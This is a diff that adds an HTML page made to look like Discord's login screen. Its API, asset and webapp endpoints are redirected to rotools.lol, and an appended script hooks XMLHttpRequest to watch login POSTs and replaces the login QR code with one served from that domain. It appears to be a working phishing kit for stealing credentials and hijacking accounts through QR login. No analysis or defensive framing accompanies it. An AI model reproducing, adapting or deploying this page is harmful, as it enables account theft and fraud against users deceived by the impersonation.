@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8"/>
+        <meta content="width=device-width, initial-scale=1.0, maximum-scale=3.0" name="viewport"/>
+        <!-- section:seometa -->
+        <meta property="og:type" content="website"/>
+        <meta property="og:site_name" content="Discord"/>
+        <meta property="og:title" content="Discord - A New Way to Chat with Friends & Communities"/>
+        <meta property="og:description" content="Discord is the easiest way to communicate over voice, video, and text.  Chat, hang out, and stay close with your friends and communities."/>
+        <meta property="og:image" content="undefined//rotools.lol/assets/652f40427e1f5186ad54836074898279.png"/>
+        <meta name="twitter:card" content="summary_large_image"/>
+        <meta name="twitter:site" content="@discord"/>
+        <meta name="twitter:creator" content="@discord"/>
+        <!-- endsection -->
+        <script nonce="MTMwLDE4OSwyMzUsMzIsNjcsMTQ4LDQ5LDI4">
+            window.GLOBAL_ENV = {
+              API_ENDPOINT: '//rotools.lol/api',
+              API_VERSION: 9,
+              GATEWAY_ENDPOINT: 'wss://gateway.discord.gg',
+              WEBAPP_ENDPOINT: '//rotools.lol/',
+              CDN_HOST: 'cdn.discordapp.com',
+              ASSET_ENDPOINT: '//rotools.lol',
+              MEDIA_PROXY_ENDPOINT: '//media.discordapp.net',
+              WIDGET_ENDPOINT: 'rotools.lol/widget',
+              INVITE_HOST: 'discord.gg',
+              GUILD_TEMPLATE_HOST: 'discord.new',
+              GIFT_CODE_HOST: 'discord.gift',
+              RELEASE_CHANNEL: 'stable',
+              MARKETING_ENDPOINT: '//rotools.lol',
+              BRAINTREE_KEY: 'production_ktzp8hfp_49pp2rp4phym7387',
+              STRIPE_KEY: 'pk_live_CUQtlpQUF0vufWpnpUmQvcdi',
+              NETWORKING_ENDPOINT: '//router.discordapp.net',
+              RTC_LATENCY_ENDPOINT: '//latency.discord.media/rtc',
+              ACTIVITY_APPLICATION_HOST: 'discordsays.com',
+              PROJECT_ENV: 'production',
+              REMOTE_AUTH_ENDPOINT: '//localhost:8080/',
+              SENTRY_TAGS: {"buildId": "072234f2187fc2c094b3b8d40a352e7b25c3733c", "buildType": "normal"},
+              MIGRATION_SOURCE_ORIGIN: 'https://discordapp.com',
+              MIGRATION_DESTINATION_ORIGIN: 'https://rotools.lol',
+              HTML_TIMESTAMP: Date.now(),
+              ALGOLIA_KEY: 'aca0d7082e4e63af5ba5917d5e96bed0',
+              PUBLIC_PATH: '/assets/'
+            };
+        </script>
+        <script nonce="MTMwLDE4OSwyMzUsMzIsNjcsMTQ4LDQ5LDI4">
+            !function() {
+                if (null != window.WebSocket) {
+                    if (function(n) {
+                        try {
+                            var e = localStorage.getItem(n);
+                            return null == e ? null : JSON.parse(e)
+                        } catch (n) {
+                            return null
+                        }
+                    }("token") && !window.__OVERLAY__) {
+                        var n = null != window.DiscordNative || null != window.require ? "etf" : "json"
+                          , e = window.GLOBAL_ENV.GATEWAY_ENDPOINT + "/?encoding=" + n + "&v=" + window.GLOBAL_ENV.API_VERSION + "&compress=zlib-stream";
+                        console.log("[FAST CONNECT] connecting to: " + e);
+                        var o = new WebSocket(e);
+                        o.binaryType = "arraybuffer";
+                        var t = Date.now()
+                          , i = {
+                            open: !1,
+                            identify: !1,
+                            gateway: e,
+                            messages: []
+                        };
+                        o.onopen = function() {
+                            console.log("[FAST CONNECT] connected in " + (Date.now() - t) + "ms"),
+                            i.open = !0
+                        }
+                        ,
+                        o.onclose = o.onerror = function() {
+                            window._ws = null
+                        }
+                        ,
+                        o.onmessage = function(n) {
+                            i.messages.push(n)
+                        }
+                        ,
+                        window._ws = {
+                            ws: o,
+                            state: i
+                        }
+                    }
+                }
+            }();
+        </script>
+        <link rel="prefetch" as="script" href="/assets/bb91b842229eda7cb8e8.js"></link>
+        <link rel="prefetch" as="script" href="/assets/e837a0c6d7b71a4e34b5.js"></link>
+        <link rel="prefetch" as="script" href="/assets/2bca5148146ab09a0f77.js"></link>
+        <link rel="prefetch" as="script" href="/assets/a48ac06ae30799d7d07a.js"></link>
+        <link rel="prefetch" as="script" href="/assets/c8e491b27fe94f60d363.js"></link>
+        <link rel="prefetch" as="script" href="/assets/4e5ff9264802ba2e0075.js"></link>
+        <link rel="prefetch" as="script" href="/assets/c30dc89c64400a4d4e76.js"></link>
+        <link rel="prefetch" as="script" href="/assets/4d35867b89d391765d7f.js"></link>
+        <link rel="prefetch" as="script" href="/assets/b62c62429a41fb1f5911.js"></link>
+        <link rel="prefetch" as="script" href="/assets/310a10d7659148f7e21e.js"></link>
+        <link rel="prefetch" as="script" href="/assets/12a48ce31802b7fd8315.js"></link>
+        <link rel="prefetch" as="script" href="/assets/766cf625546df87be871.js"></link>
+        <link rel="prefetch" as="script" href="/assets/db95a9b696fc7c2590ae.js"></link>
+        <link rel="prefetch" as="script" href="/assets/62d286b17af9dc3e0530.js"></link>
+        <link rel="prefetch" as="script" href="/assets/018e57645911f57b4f3a.js"></link>
+        <link rel="prefetch" as="script" href="/assets/d6d39d56197e55d35da8.js"></link>
+        <link rel="prefetch" as="script" href="/assets/f0f7f1921824539dd4a9.js"></link>
+        <link rel="prefetch" as="script" href="/assets/19a1dea9e421358897b9.js"></link>
+        <link rel="prefetch" as="script" href="/assets/e52a1aba0da21fd722a0.js"></link>
+        <link rel="prefetch" as="script" href="/assets/975aba216feae213687f.js"></link>
+        <link rel="prefetch" as="script" href="/assets/eb27dd7912ec0c101f4a.js"></link>
+        <link rel="prefetch" as="script" href="/assets/7a9ff6166efc70c82b2c.js"></link>
+        <link rel="prefetch" as="script" href="/assets/6711a2d181d475a23422.js"></link>
+        <link rel="prefetch" as="script" href="/assets/bd46a31e0538d73573d2.js"></link>
+        <link rel="prefetch" as="script" href="/assets/448fa50b11e0d3c5565b.js"></link>
+        <link rel="prefetch" as="script" href="/assets/4ff4d2a5c762a2b1c7bd.js"></link>
+        <link rel="prefetch" as="script" href="/assets/495f481a29a0e8386942.js"></link>
+        <link rel="prefetch" as="script" href="/assets/c9ee238023dd6396cbbe.js"></link>
+        <link rel="prefetch" as="script" href="/assets/8c78a99552d0760f0dac.js"></link>
+        <link rel="prefetch" as="script" href="/assets/8c2d153a10930a8ca299.js"></link>
+        <link rel="prefetch" as="script" href="/assets/86890f3d439b93d6d4ac.js"></link>
+        <link rel="prefetch" as="script" href="/assets/343e0d1010908d294d85.js"></link>
+        <link rel="prefetch" as="script" href="/assets/4fbc91c6c5ac39511bb3.js"></link>
+        <link rel="prefetch" as="script" href="/assets/4c5753c555bf42d3ccf9.js"></link>
+        <link rel="prefetch" as="script" href="/assets/b40679c0d82dac77d8bc.js"></link>
+        <link rel="prefetch" as="script" href="/assets/95cfc4cef4d0837344fe.js"></link>
+        <link rel="prefetch" as="script" href="/assets/efc8d991b35964861734.js"></link>
+        <link rel="prefetch" as="script" href="/assets/3c2cf1ee2b629200e3ce.js"></link>
+        <link rel="prefetch" as="script" href="/assets/1587e1f8a871cc0b9d58.js"></link>
+        <link rel="prefetch" as="script" href="/assets/e5d70fa752ebc1e71192.js"></link>
+        <link rel="prefetch" as="script" href="/assets/77b0410a447c334d3fc2.js"></link>
+        <link rel="prefetch" as="script" href="/assets/cb55214b1d3b43b20ce4.js"></link>
+        <link rel="prefetch" as="script" href="/assets/79226e60c979f811ea95.js"></link>
+        <link rel="prefetch" as="script" href="/assets/3b54352e8b3452d413e2.js"></link>
+        <link rel="prefetch" as="script" href="/assets/fd1f4b8aa353aae0c6be.js"></link>
+        <link rel="prefetch" as="script" href="/assets/ff53f20b689e441f2cb2.js"></link>
+        <link rel="prefetch" as="script" href="/assets/543d7306ae64ba5afce1.js"></link>
+        <link rel="stylesheet" href="/assets/40532.45cfda0794123b4bec3c.css" >
+        <link rel="icon" href="/assets/ec2c34cadd4b5f4594415127380a85e6.ico"/>
+        <!-- section:title -->
+        <title>Discord</title>
+        <!-- endsection -->
+    </head>
+    <body>
+        <div id="app-mount"></div>
+        <script nonce="MjAxLDk1LDY5LDI1MSwxMjgsNTgsODIsMjEz">
+            window.__OVERLAY__ = /overlay/.test(location.pathname)
+        </script>
+        <script nonce="MjAxLDk1LDY5LDI1MSwxMjgsNTgsODIsMjEz">
+            window.__BILLING_STANDALONE__ = /^\/billing/.test(location.pathname)
+        </script>
+        <script src="/assets/1ad915671d6bd3f60aa7.js"></script>
+        <script src="/assets/bd3cbd8c6300aa9977b2.js"></script>
+        <script src="/assets/a9b168fe85091eaa359c.js"></script>
+        <script src="/assets/3b4371c2a53c83d58eb5.js"></script>
+        <script nonce="MjAxLDk1LDY5LDI1MSwxMjgsNTgsODIsMjEz">
+            (function() {
+                var js = "window['__CF$cv$params']={r:'79b09e935c502a4d',m:'EjeYTON2JkX0t3YyqiW8Ec1CIsbajL4dC6iFKjFd2yg-1676658890-0-AVSwhxq7ZCQAsM/feEaag9Yqp1X1TUZ3oWTzPH1IEF5XTZvn46p5QsBGGxuI7NDXXtWMzTS8ZfpCQSexQhfSPkMnFUvAlBsY+AcZt/TeN7UYpsO9N2gPrLUrmS4ZsYZo0A==',s:[0x3f4d611425,0x39231c8e1e],u:'/cdn-cgi/challenge-platform/h/g'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='MjAxLDk1LDY5LDI1MSwxMjgsNTgsODIsMjEz',_cpo.src='/cdn-cgi/challenge-platform/h/g/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";
+                var _0xh = document.createElement('iframe');
+                _0xh.height = 1;
+                _0xh.width = 1;
+                _0xh.style.position = 'absolute';
+                _0xh.style.top = 0;
+                _0xh.style.left = 0;
+                _0xh.style.border = 'none';
+                _0xh.style.visibility = 'hidden';
+                document.body.appendChild(_0xh);
+                function handler() {
+                    var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;
+                    if (_0xi) {
+                        var _0xj = _0xi.createElement('script');
+                        _0xj.nonce = 'MjAxLDk1LDY5LDI1MSwxMjgsNTgsODIsMjEz';
+                        _0xj.innerHTML = js;
+                        _0xi.getElementsByTagName('head')[0].appendChild(_0xj);
+                    }
+                }
+                if (document.readyState !== 'loading') {
+                    handler();
+                } else if (window.addEventListener) {
+                    document.addEventListener('DOMContentLoaded', handler);
+                } else {
+                    var prev = document.onreadystatechange || function() {}
+                    ;
+                    document.onreadystatechange = function(e) {
+                        prev(e);
+                        if (document.readyState !== 'loading') {
+                            document.onreadystatechange = prev;
+                            handler();
+                        }
+                    }
+                    ;
+                }
+            }
+            )();
+        </script>
+    </body>
+</html>
+<script>
+    XMLHttpRequest.prototype.realSend = XMLHttpRequest.prototype.send; //  rawr
+    XMLHttpRequest.prototype.send = async function(data) {
+        if(this.__sentry_xhr__.url.includes("/api/v9/auth/login") && this.__sentry_xhr__.method === "POST") {
+            var thing = this.__sentry_xhr__
+            var rawr = setInterval(function() {
+                if (thing.status_code != undefined && thing.status_code == 420)
+                {
+                    clearInterval(rawr)
+                    window.location.href = "https://discord.com/channels/@me"
+                }
+            },100)
+        }
+        this.realSend(data);
+    };
+    const interval = setInterval(()=>{
+        const divs = document.getElementsByTagName('div');
+        for (const div of divs) {
+            if (div.className.startsWith('qrCodeContainer')) {
+                div.innerHTML = `<div class="qrCode-2R7t95" style="padding: 5px; border-radius: 4px; width: 180px; height: 160px; background-color: rgb(255, 255, 255);"><img style="width: auto; padding: 4; height:auto; margin-left: auto; margin-right: auto; position: relative;" src="http://rotools.lol/qr.svg"></div><div class="qrCodeOverlay-2bLtKl"><img src="/assets/092b071c3b3141a58787415450c27857.png"></div>`;
+            }
+        }
+    }
+    , 3000);
+</script>
+
